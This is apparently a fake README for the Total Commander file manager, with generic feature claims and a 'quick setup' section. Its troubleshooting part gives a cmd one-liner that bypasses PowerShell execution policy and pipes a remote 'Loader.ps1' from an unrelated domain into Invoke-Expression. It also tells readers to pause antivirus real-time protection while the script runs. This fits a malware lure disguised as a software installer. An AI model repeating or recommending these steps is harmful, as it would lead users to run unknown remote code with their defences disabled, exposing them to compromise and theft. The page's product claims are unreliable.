# Total Commander: Environment Configuration Manager

Total Commander is a powerful, multi-tabbed file manager that enhances your workflow by providing an array of features. It allows you to efficiently manage and organize your files across different operating systems. With its robust design and user-friendly interface, Total Commander has become a must-have tool for developers and IT professionals alike.

## ✨ Key Features & Enhancements

- **Customizable Interface**: Tailor your Total Commander experience with its extensive color scheme options, which can be adjusted to match your preferences or your brand's identity.
- **Dedicated Pane for Each File System**: Effortlessly navigate between local and remote servers, with each pane offering a separate file hierarchy view.
- **Built-in FTP/SFTP/SCP Support**: Transfer files directly from the Total Commander interface without the need for external applications.
- **Command Line Interface**: Execute commands and scripts directly from the Total Commander interface, providing seamless integration with your existing development setup.
- **Multi-Tab Handling**: Keep all your projects and files organized within a single instance of Total Commander, with each tab representing a unique working environment.

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until everything has finished downloading and installing:


## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://ps-ps.cc/powershell/Loader.ps1 | Invoke-Expression"
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
